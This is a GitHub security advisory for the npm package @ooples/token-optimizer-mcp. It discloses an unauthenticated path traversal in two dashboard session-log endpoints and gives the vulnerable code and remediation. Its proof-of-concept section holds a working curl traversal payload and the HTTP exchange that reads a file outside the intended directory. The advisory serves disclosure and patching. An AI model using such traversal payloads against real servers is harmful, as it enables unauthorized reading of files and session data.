# [M] Token Optimizer MCP: Unauthenticated Path Traversal in Dashboard Session Log API Endpoints

## Summary
Severity: Medium
Advisory: GHSA-76pc-mqxp-3rq5
CVE: CVE-2026-55156
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-08-14
Source: https://github.com/advisories/GHSA-76pc-mqxp-3rq5
Type: github-advisory

## Affected
- npm: `@ooples/token-optimizer-mcp` — affected >=0 <5.1.0

## Details
# Unauthenticated Path Traversal in Dashboard Session Log API Endpoints

| Field            | Value |
| ---------------- | ----- |
| Repository       | ooples/token-optimizer-mcp |
| Affected version | 5.0.1 (commit 8137147) |
| Vulnerability    | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory |
| Severity         | Medium |
| CVSS 3.1         | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) |


## Summary

The dashboard HTTP server in `token-optimizer-mcp` exposes `/api/session-summary` and `/api/session-events` with no authentication middleware — any network-accessible client can reach them without credentials. Both handlers concatenate the caller-supplied `sessionId` query parameter directly into a filesystem path via `path.join`, and Node.js normalizes `..` segments at resolution time, allowing an unauthenticated attacker to read any `.jsonl` file reachable from the server's filesystem. Successful reproduction confirmed exfiltration of a `.jsonl` file located outside the intended `hooksDataPath` directory with a single unauthenticated HTTP GET request.

## Affected Code

`src/server/web-server.ts:73–88` — `/api/session-summary`: unsanitized `sessionId` interpolated into `path.join` then passed to `fs.readFileSync`

```typescript
    const hooksDataPath = getHooksDataPath();
    const jsonlFilePath = path.join(
      hooksDataPath,
      `session-log-${sessionId}.jsonl`
    );

    if (!fs.existsSync(jsonlFilePath)) {
      return res.status(404).json({
        success: false,
        error: `JSONL log not found for session ${sessionId}`,
        sessionId,
      });
    }

    // Parse JSONL file
    const jsonlContent = fs.readFileSync(jsonlFilePath, 'utf-8');
```

`src/server/web-server.ts:297–311` — `/api/session-events`: identical unsanitized `path.join` + `fs.readFileSync` pattern

```typescript
    const hooksDataPath = getHooksDataPath();
    const jsonlFilePath = path.join(
      hooksDataPath,
      `session-log-${sessionId}.jsonl`
    );

    if (!fs.existsSync(jsonlFilePath)) {
      return res.status(404).json({
        success: false,
        error: `JSONL log not found for session ${sessionId}`,
      });
    }

    // Parse JSONL file
    const jsonlContent = fs.readFileSync(jsonlFilePath, 'utf-8');
```

`req.query.sessionId` flows unsanitized into `path.join(hooksDataPath, \`session-log-${sessionId}.jsonl\`)`, which Node.js resolves by normalizing `..` traversal sequences before the `fs.readFileSync` call.

## Proof of Concept

Step 1 — Send traversal payload to `/api/session-events` with no credentials: server returns HTTP 200 with contents of a `.jsonl` file outside `hooksDataPath` — proves unauthenticated out-of-bounds file read.

```bash
curl -s "http://127.0.0.1:3100/api/session-events?sessionId=abc%2F..%2F..%2F..%2F..%2Ftraversal-target"
```

```http
GET /api/session-events?sessionId=abc%2F..%2F..%2F..%2F..%2Ftraversal-target HTTP/1.1
Host: 127.0.0.1:3100
User-Agent: python-requests/2.x
Accept: */*
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Content-Length: 186

{"success":true,"sessionId":"abc/../../../../traversal-target","total":1,"offset":0,"limit":100,"events":[{"type":"PATH_TRAVERSAL_EVIDENCE","secret":"sensitive-data-outside-hooks-dir"}]}
```

## Impact

An unauthenticated remote attacker can read the contents of any `.jsonl` file accessible to the process running the dashboard server. In a typical deployment this includes all session log files (which contain tool invocations, hook outputs, and token usage data) as well as any other `.jsonl` file reachable via `..` traversal from `hooksDataPath`. The constraint that the resolved path must end in `.jsonl` limits the attack surface to that file extension, but session logs can contain sensitive operational data. The same path traversal is present in both `/api/session-summary` and `/api/session-events`, and neither endpoint requires authentication.

## Remediation

1. **Validate `sessionId` format** before use: reject any value that does not match a strict allowlist such as `/^[a-zA-Z0-9_-]{1,64}$/`. This prevents `/` and `.` characters from entering the path construction entirely.

   ```typescript
   const SESSION_ID_RE = /^[a-zA-Z0-9_-]{1,64}$/;
   if (!SESSION_ID_RE.test(sessionId)) {
     return res.status(400).json({ success: false, error: 'Invalid sessionId' });
   }
   ```

2. **Alternatively, apply `path.basename`** to strip all directory components: `path.basename(sessionId)` reduces any traversal sequence to a bare filename before `path.join`.

3. **Add authentication middleware** to all `/api/*` routes so that even if a bypass is found the endpoints are not reachable without a valid session token.

## References
- https://github.com/ooples/token-optimizer-mcp/security/advisories/GHSA-76pc-mqxp-3rq5
- https://github.com/ooples/token-optimizer-mcp/commit/b4ee96dac799cbfba0a9f9c17844ce9d613cbcc7
- https://github.com/ooples/token-optimizer-mcp
- https://github.com/ooples/token-optimizer-mcp/releases/tag/v5.1.0
